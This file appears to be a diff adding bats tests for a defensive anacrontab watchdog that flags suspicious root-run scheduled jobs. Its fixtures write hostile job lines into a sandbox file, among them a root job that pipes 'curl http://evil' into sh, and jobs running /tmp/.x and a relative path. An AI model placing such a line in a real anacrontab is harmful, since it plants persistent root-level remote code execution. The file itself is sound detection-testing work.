@@ -1,0 +1,144 @@
+#!/usr/bin/env bats
+# L2 bats functional tests for the anacrontab-watchdog scan script.
+#
+# /etc/anacrontab runs `period delay job-id command…` entries AS ROOT when
+# the machine has been off past the period — a scheduler-persistence vector
+# cron-job-watchdog does not see. A job command under a writable root,
+# relative-with-slash, or an injection pattern anywhere in the file is alert;
+# bare commands (run-parts, nice) are normal.
+#
+# Runs the actual scan script with `logger` shadowed on PATH and the
+# anacrontab in a tmp sandbox via SELFDEF_ANACRON_FILE.
+#
+# Run with: bats packaging/test/L2-anacrontab-watchdog.bats
+
+WD="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd/anacrontab-watchdog.sh"
+
+setup() {
+    TMP="$(mktemp -d)"
+    BIN="${TMP}/bin"; mkdir -p "${BIN}"
+    cat > "${BIN}/logger" <<'FAKELOGGER'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
+FAKELOGGER
+    chmod +x "${BIN}/logger"
+    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    BASELINE="${TMP}/baseline.tsv"
+    ANAC="${TMP}/anacrontab"
+    BENIGN='SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+1	5	cron.daily	run-parts --report /etc/cron.daily
+7	25	cron.weekly	run-parts --report /etc/cron.weekly
+'
+}
+
+teardown() { rm -rf "${TMP}"; }
+
+run_wd() {
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_ANACRON_PROFILE="${PROFILE:-report}" \
+    SELFDEF_ANACRON_BASELINE="${BASELINE}" \
+    SELFDEF_ANACRON_FILE="${ANAC_F:-$ANAC}" \
+    bash "${WD}"
+}
+
+cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
+
+# ============================================================
+# ok tier
+# ============================================================
+
+@test "no anacrontab → ok / no_anacrontab" {
+    ANAC_F="${TMP}/nonexistent" run_wd
+    cap | grep -q '"event":"no_anacrontab"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "benign anacrontab, first run → ok / baseline_initial" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -q '"severity":"ok"'
+    [ -f "${BASELINE}" ]
+}
+
+@test "unchanged anacrontab on second run → ok / anacrontab_intact" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"anacrontab_intact"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# alert tier
+# ============================================================
+
+@test "a job command under a writable root → alert / anacrontab_suspicious" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd                                   # benign baseline
+    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"anacrontab_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "a job line carrying a curl|sh injection → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t/bin/sh -c "curl http://evil|sh"\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "a relative-with-slash job command → alert" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t./rel/x\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+# ============================================================
+# warn tier
+# ============================================================
+
+@test "a benign job added → warn / anacrontab_changed" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s30\t45\tcron.monthly\trun-parts --report /etc/cron.monthly\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"anacrontab_changed"'
+    cap | grep -q '"severity":"warn"'
+}
+
+# ============================================================
+# false-positive guard
+# ============================================================
+
+@test "standard run-parts jobs are NOT flagged" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+# ============================================================
+# enforce profile
+# ============================================================
+
+@test "enforce profile exits non-zero on a suspicious job" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    PROFILE=enforce run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"severity":"alert"'
+}
